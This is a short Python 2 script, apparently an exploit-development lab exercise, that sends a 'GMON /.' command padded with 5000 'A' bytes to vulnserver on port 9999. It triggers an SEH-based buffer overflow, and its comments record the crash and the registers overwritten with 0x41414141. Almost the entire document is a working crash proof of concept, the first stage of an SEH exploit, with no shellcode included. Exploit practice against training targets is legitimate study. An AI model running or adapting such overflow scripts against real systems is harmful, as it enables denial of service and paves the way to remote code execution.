#!/usr/bin/python

#Attack type: seh buffer overflow en GMON para vulnserver.
#Scope: seh overflow without shellcode injection.
#Payload: GMON /.AAAAAAAAAAAAAAA... (A 5000 times)
#Results: Access violation when writing to 02590000... SEH [0258FFC4 - 41414141 / 41414141 *** CORRUPT ENTRY ***] EDX [41414141] ECX [ASCII AAA...] EBP [ASCII AAA...]

import socket
import os
import sys
import time

host = "192.168.0.2"
port = 9999

buffer = "GMON /." + "A" * 5000

operation = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
operation.connect((host,port))
try:
	operation.sendall(buffer)
	time.sleep(5)
	operation.settimeout(5)
	data = operation.recv(2048)
	print(data)
except socket.error, e:
	print("Connection error: %s" % e)
	sys.exit(1)

operation.close()
sys.exit()

